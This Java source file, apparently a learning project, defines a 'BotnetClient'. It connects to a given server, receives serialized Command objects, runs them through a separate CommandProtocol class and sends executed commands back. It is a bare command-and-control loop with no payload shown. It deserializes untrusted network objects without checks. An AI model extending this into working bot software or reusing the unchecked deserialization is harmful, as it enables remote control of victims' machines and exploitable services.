import java.net.*;
import java.io.*;

public class BotnetClient {
    public static void main(String[] args) throws IOException {
        ObjectInputStream in = null;
        ObjectOutputStream out = null;
        Command inCommand = null;
        Socket socket = null;
        CommandProtocol commandP = new CommandProtocol();

        if (args.length != 2){
            System.err.println(
                "Usage: java EchoClient <host name> <port number>");
            System.exit(1);
        }

        String hostName = args[0];
        int portNumber = Integer.parseInt(args[1]);

        try{
            socket = new Socket(hostName, portNumber);
            out = new ObjectOutputStream(socket.getOutputStream());
            in = new ObjectInputStream(socket.getInputStream());
            inCommand = (Command) in.readObject();
        } catch (UnknownHostException e) {
            System.err.println("Don't know about host " + hostName);
            System.exit(1);
        } catch (IOException e) {
            System.err.println("Couldn't get I/O for the connection to " +
                hostName);
            System.exit(1);
        } catch (ClassNotFoundException e){
            System.err.println("IMClient Class not found");
            System.exit(1);
        }

        BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
        String commandInstructions;
        String fromUser;

        while ((commandInstructions = inCommand.getInstructions()) != null){
            System.out.println("Running Command " + inCommand.getCommandName());
            

            String result = commandP.processCommand(inCommand);

            // if (result.equalsIgnoreCase("exiting")){
            //     break;
            // }
            
            System.out.println("Command Result: " + result);
            // System.out.println("Command Response: " + inCommand.getResponse());
            // System.out.println("Command Error Status: " + inCommand.getErrorStatus());
            // System.out.println("Command Is Executed: " + inCommand.getIsExecuted());

            //mutate the command
            if (!inCommand.getErrorStatus() && inCommand.getIsExecuted()){
                out.writeObject(inCommand);
            }

            try{
                if (!inCommand.getErrorStatus())
                    inCommand = (Command) in.readObject();
            }
            catch (ClassNotFoundException cnfe){
                System.err.println("BotNetClient: Problem reading object: class not found");
                System.err.println(cnfe);
                System.exit(1);
            }

        }

        out.close();
        in.close();
        stdIn.close();
        socket.close();
    }    
}
